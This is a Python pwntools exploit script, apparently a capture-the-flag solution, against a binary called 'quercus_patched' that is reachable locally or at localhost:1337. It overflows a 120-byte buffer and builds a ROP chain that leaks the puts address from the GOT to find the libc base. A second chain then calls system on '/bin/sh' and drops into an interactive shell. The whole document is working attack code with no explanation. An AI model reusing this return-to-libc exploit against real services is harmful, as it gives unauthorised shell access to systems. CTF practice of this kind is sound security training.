from pwn import *
from icecream import ic

elf = exe = ELF("./quercus_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("localhost", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''

c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

pop_rdi = 0x00000000004013d3
ret = 0x000000000040101a

payload = b"A"*120
payload += p64(0x000000000040101a)
payload += p64(pop_rdi)
payload += p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(0x000000000040101a)
payload += p64(0x401216)

sla("species: ", payload)
sla("edit: ", "7")

rl()
libc_base = unpack(rl()[:-1] + b"\x00\x00") - 0x84420
ic(hex(libc_base))


payload = b"A"*120
payload += p64(pop_rdi)
payload += p64(libc_base + 0x1b45bd)
payload += p64(ret)
payload += p64(libc_base + 0x52290)

sla("species: ", payload)
sla("edit: ", "7")

i()
